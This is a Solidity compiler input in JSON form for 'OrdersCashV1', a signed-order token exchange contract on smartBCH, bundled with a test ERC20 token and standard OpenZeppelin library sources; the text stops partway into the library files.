{
  "language": "Solidity",
  "sources": {
    "contracts/OrdersCashV1.sol": {
      "content": "// SPDX-License-Identifier: Apache\npragma solidity 0.8.10;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n\n\ncontract OrdersCashV1 is Ownable {\n    address private constant SEP206_ADDRESS = 0x0000000000000000000000000000000000002711;\n    // address private constant BCH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n    address private constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;\n\n    string private constant EIP712_DOMAIN = \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract,bytes32 salt)\";\n    bytes32 private constant EIP712_DOMAIN_TYPEHASH = keccak256(abi.encodePacked(EIP712_DOMAIN));\n    bytes32 private constant NAME_HASH = keccak256(abi.encodePacked(\"exchange dapp\"));\n    bytes32 private constant VERSION_HASH = keccak256(abi.encodePacked(\"v0.1.0\"));\n    uint256 private constant CHAINID = 10000; // smartBCH mainnet\n    bytes32 private constant SALT = keccak256(abi.encodePacked(\"Exchange\"));\n    uint8 private constant VERSION = 1;\n\n    bytes32 private constant TYPE_HASH = keccak256(abi.encodePacked(\"Exchange(uint256 coinsToMaker,uint256 coinsToTaker,uint256 dueTime80)\"));\n\n    uint256 private constant MUL = 10**12; // number of picoseconds in one second\n    uint256 private constant MaxClearCount = 10;\n\n    //To prevent replay of coin-exchanging messages, we use dueTime to identify a coin-exchanging message uniquely\n    mapping(address => mapping(uint256 => uint256)) public makerNextRecentDueTime; //the pointers of a linked-list\n    mapping(address => uint256) public makerRDTHeadTail; //the head and tail of a linked-list\n\n    //A maker and a taker exchange their coins\n    event Exchange(\n        address indexed maker,\n        address indexed taker,\n        address coinTypeToMaker,\n        uint256 coinAmountToMaker,\n        address coinTypeToTaker,\n        uint256 coinAmountToTaker,\n        uint256 dueTime80\n    );\n    event NewDueTime(address indexed maker, uint256 newDueTime, uint256 currTime);\n\n    // function isBCH(address tokenAddr) internal pure returns (bool) {\n    //     return (tokenAddr == ZERO_ADDRESS || tokenAddr == BCH_ADDRESS || tokenAddr == SEP206_ADDRESS);\n    // }\n\n    function getEIP712Hash(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80\n    ) public view returns (bytes32) {\n        bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, NAME_HASH, VERSION_HASH, CHAINID, address(this), SALT));\n        return\n            keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR, keccak256(abi.encode(TYPE_HASH, coinsToMaker, coinsToTaker, dueTime80))));\n    }\n\n    function getSigner(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) public view returns (address) {\n        bytes32 eip712Hash = getEIP712Hash(coinsToMaker, coinsToTaker, dueTime80_v8_version8 >> 16);\n        uint8 v = uint8(dueTime80_v8_version8 >> 8);\n        return ecrecover(eip712Hash, v, r, s);\n    }\n\n    // Returns recent recorded dueTimes of a maker\n    function getRecentDueTimes(address makerAddr, uint256 maxCount) external view returns (uint256[] memory) {\n        uint256 head = makerRDTHeadTail[makerAddr] >> 80;\n        uint256[] memory recentDueTimes = new uint256[](maxCount);\n        for (uint256 i = 0; i < maxCount && head != 0; ++i) {\n            recentDueTimes[i] = head;\n            head = makerNextRecentDueTime[makerAddr][head];\n        }\n        return recentDueTimes;\n    }\n\n    // By adding a new dueTime entry in the linked-list, we can revoke a coin-exchanging message\n    function addNewDueTime(uint256 newDueTime) external {\n        require(newDueTime != 0, \"OrdersCashV1: invalid dueTime\");\n        uint256 currTime = block.timestamp * MUL;\n        clearOldDueTimesAndInsertNew(msg.sender, newDueTime, currTime);\n        emit NewDueTime(msg.sender, newDueTime, currTime);\n    }\n\n    // Delete some useless entries from the linked list\n    function clearOldDueTimes(uint256 maxCount, address makerAddr) external {\n        uint256 currTime = block.timestamp * MUL;\n        uint256 headTail = makerRDTHeadTail[makerAddr];\n        (uint256 head, uint256 tail) = (headTail >> 80, uint256(uint80(headTail)));\n        (head, tail) = _clearOldDueTimes(maxCount, makerAddr, currTime, head, tail);\n        makerRDTHeadTail[makerAddr] = (head << 80) | tail;\n    }\n\n    // If a message's dueTime was recorded in the linked-list before, it is a replay and can't take effect\n    function isReplay(address makerAddr, uint256 dueTime) external view returns (bool) {\n        uint256 tail = uint80(makerRDTHeadTail[makerAddr]);\n        return tail == dueTime || makerNextRecentDueTime[makerAddr][dueTime] != 0;\n    }\n\n    //Delete some useless entries from the linked list and insert a new one\n    function clearOldDueTimesAndInsertNew(\n        address makerAddr,\n        uint256 newDueTime,\n        uint256 currTime\n    ) private {\n        uint256 headTail = makerRDTHeadTail[makerAddr];\n        (uint256 head, uint256 tail) = (headTail >> 80, uint256(uint80(headTail)));\n        require(tail != newDueTime && makerNextRecentDueTime[makerAddr][newDueTime] == 0, \"OrdersCashV1: dueTime not new\");\n\n        (head, tail) = _clearOldDueTimes(MaxClearCount, makerAddr, currTime, head, tail);\n        (head, tail) = _addNewDueTime(makerAddr, newDueTime, head, tail);\n        makerRDTHeadTail[makerAddr] = (head << 80) | tail;\n    }\n\n    // The linked-list:\n    // No entries in queue: head = 0, tail = 0\n    // One entry in queue: head = dueTime, tail = dueTime\n    // Two entries in queue: head = A, tail = B, makerNextRecentDueTime[makerAddr][A] = B\n    function _clearOldDueTimes(\n        uint256 maxCount,\n        address makerAddr,\n        uint256 currTime,\n        uint256 head,\n        uint256 tail\n    ) private returns (uint256, uint256) {\n        for (uint256 i = 0; i < maxCount && head < currTime && head != 0; ++i) {\n            uint256 newHead = makerNextRecentDueTime[makerAddr][head];\n            makerNextRecentDueTime[makerAddr][head] = 0;\n            head = newHead;\n        }\n\n        if (head == 0) {\n            tail = 0;\n        }\n\n        return (head, tail);\n    }\n\n    function _addNewDueTime(\n        address makerAddr,\n        uint256 dueTime,\n        uint256 head,\n        uint256 tail\n    ) private returns (uint256, uint256) {\n        if (head == 0) {\n            return (dueTime, dueTime);\n        }\n\n        makerNextRecentDueTime[makerAddr][tail] = dueTime;\n        return (head, dueTime);\n    }\n\n    // A taker exchanges with a maker, using a message signature generated by the maker\n    function directExchange(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) external payable {\n        _directExchange(coinsToMaker, coinsToTaker, dueTime80_v8_version8, r, s);\n    }\n\n    function _directExchange(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) private {\n        uint256 dueTime = uint80(dueTime80_v8_version8 >> 16);\n        uint256 currTime = block.timestamp * MUL;\n        require(currTime < dueTime, \"OrdersCashV1: order expired\");\n        require(uint8(dueTime80_v8_version8) == VERSION, \"OrdersCashV1: version does not match\");\n\n        address makerAddr = getSigner(coinsToMaker, coinsToTaker, dueTime80_v8_version8, r, s);\n\n        clearOldDueTimesAndInsertNew(makerAddr, dueTime, currTime);\n        address takerAddr = msg.sender;\n\n        address coinTypeToMaker = address(bytes20(uint160(coinsToMaker >> 96)));\n        uint256 coinAmountToMaker = uint256(uint96(coinsToMaker));\n        address coinTypeToTaker = address(bytes20(uint160(coinsToTaker >> 96)));\n        uint256 coinAmountToTaker = uint256(uint96(coinsToTaker));\n\n        require(coinTypeToMaker != coinTypeToTaker, \"OrdersCashV1: both tokens are the same\");\n\n        if (coinTypeToMaker == ZERO_ADDRESS) {\n            coinTypeToMaker = SEP206_ADDRESS;\n        }\n\n        if (coinTypeToTaker == ZERO_ADDRESS) {\n            coinTypeToTaker = SEP206_ADDRESS;\n        }\n\n        require(coinTypeToMaker != SEP206_ADDRESS || msg.value <= coinAmountToMaker, \"OrdersCashV1: BCH sent exceeds the amount to be sent\");\n\n        if (coinAmountToTaker != 0) {\n            (bool success, bytes memory _notUsed) = coinTypeToTaker.call(\n                abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", makerAddr, takerAddr, coinAmountToTaker)\n            );\n            require(success, \"OrdersCashV1: transferFrom failed\");\n        }\n\n        if (coinAmountToMaker != 0) {\n            if (coinTypeToMaker == SEP206_ADDRESS) {\n                require(msg.value == coinAmountToMaker, \"OrdersCashV1: BCH not enough\");\n                (bool success, bytes memory _notUsed) = makerAddr.call{gas: 9000, value: coinAmountToMaker}(\"\");\n                require(success, \"transfer fail\");\n            } else {\n                require(msg.value == 0, \"OrdersCashV1: no need for BCH\");\n                IERC20(coinTypeToMaker).transferFrom(takerAddr, makerAddr, coinAmountToMaker);\n            }\n        }\n\n        emit Exchange(makerAddr, takerAddr, coinTypeToMaker, coinAmountToMaker, coinTypeToTaker, coinAmountToTaker, dueTime);\n    }\n}\n"
    },
    "@openzeppelin/contracts/access/Ownable.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n"
    },
    "@openzeppelin/contracts/utils/Context.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/ERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n"
    },
    "contracts/TestERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract TestERC20 is ERC20 {\n    uint8 private dec;\n\n    constructor(\n        string memory symbol,\n        uint256 initialSupply,\n        uint8 _dec\n    ) ERC20(symbol, symbol) {\n        dec = _dec;\n        _mint(msg.sender, initialSupply);\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return dec;\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/utils/SafeERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\nimport \"../extensions/draft-IERC20Permit.sol\";\nimport \"../../../utils/Address.sol\";\n\n/**\n * @title SafeERC20\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\n * contract returns false). Tokens that return no value (and instead revert or\n * throw on failure) are also supported, non-reverting calls are assumed to be\n * successful.\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\n */\nlibrary SafeERC20 {\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n    /**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * {IERC20-approve}, and its usage is discouraged.\n     *\n     * Whenever possible, use {safeIncreaseAllowance} and\n     * {safeDecreaseAllowance} instead.\n     */\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    }\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        unchecked {\n            uint256 oldAllowance = token.allowance(address(this), spender);\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\n            uint256 newAllowance = oldAllowance - value;\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n        }\n    }\n\n    function safePermit(\n        IERC20Permit token,\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal {\n        uint256 nonceBefore = token.nonces(owner);\n        token.permit(owner, spender, value, deadline, v, r, s);\n        uint256 nonceAfter = token.nonces(owner);\n        require(nonceAfter == nonceBefore + 1, \"SafeERC20: permit did not succeed\");\n    }\n\n    /**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\n        if (returndata.length > 0) {\n            // Return data is optional\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        }\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol": {
